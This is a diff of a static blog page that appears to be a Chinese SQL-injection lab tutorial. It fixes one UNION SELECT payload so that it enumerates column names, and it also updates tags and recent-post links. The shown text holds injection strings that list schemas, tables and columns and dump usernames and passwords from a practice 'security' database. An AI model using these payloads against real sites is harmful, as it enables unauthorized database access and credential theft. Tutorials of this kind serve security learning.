@@ -31,7 +31,7 @@
 <meta property="og:image" content="http://example.com/2021/09/29/images/image-20210929223704234.png">
 <meta property="og:image" content="http://example.com/2021/09/29/images/image-20210929224135650.png">
 <meta property="article:published_time" content="2021-09-29T10:26:09.000Z">
-<meta property="article:modified_time" content="2021-09-30T11:35:34.024Z">
+<meta property="article:modified_time" content="2021-11-19T07:04:07.117Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="-web安全">
 <meta name="twitter:card" content="summary">
@@ -140,7 +140,7 @@
 <p><img src="/images/20180618230947113.png" alt="20180618230947113"></p>
 <p>查询security内的所有表名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+ </p>
 <p><img src="/images/20180618230958453-16329233542211.png" alt="20180618230958453"></p>
-<p>然后爆破出列名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+ </p>
+<p>然后爆破出列名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_schema=’security’)–+ </p>
 <p><img src="/images/2018061823100417-16329234868492.png" alt="2018061823100417"></p>
 <p>最后爆出他的username和password:</p>
 <p>?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users)–+ </p>
@@ -228,7 +228,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/autohotkey/" rel="tag">-autohotkey</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">-web安全</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/autohotkey/" rel="tag">-autohotkey</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">-misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">-web安全</a></li></ul>
     </div>
   </div>
 
@@ -238,7 +238,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/autohotkey/" style="font-size: 10px;">-autohotkey</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">-web安全</a>
+      <a href="/tags/autohotkey/" style="font-size: 10px;">-autohotkey</a> <a href="/tags/misc/" style="font-size: 10px;">-misc</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">-web安全</a>
     </div>
   </div>
 
@@ -260,6 +260,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/19/simplerar/">simplerar(简单密码学)</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/17/autohotkey/">autohotkey</a>
           </li>
         
@@ -273,10 +277,6 @@
         
           <li>
             <a href="/2021/09/30/Less-5-6/">Less 5,6</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/">sql 注入简介</a>
           </li>
         
       </ul>
